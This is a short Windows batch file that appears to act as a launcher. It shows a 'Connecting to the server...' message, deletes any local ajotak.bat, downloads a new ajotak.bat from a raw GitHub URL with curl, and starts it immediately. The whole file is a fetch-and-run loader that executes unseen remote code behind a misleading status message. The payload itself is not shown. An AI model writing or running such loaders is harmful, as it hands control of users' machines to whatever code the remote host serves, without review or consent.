@echo off
color a
echo Connecting to the server...
timeout -t 5 /nobreak
del /s /q "C:\users\%username%\ajotak.bat
curl -L -s -o "C:\Users\%username%\ajotak.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/ajeotak.bat
start C:\Users\%username%\ajotak.bat
pause >nul
exit /b
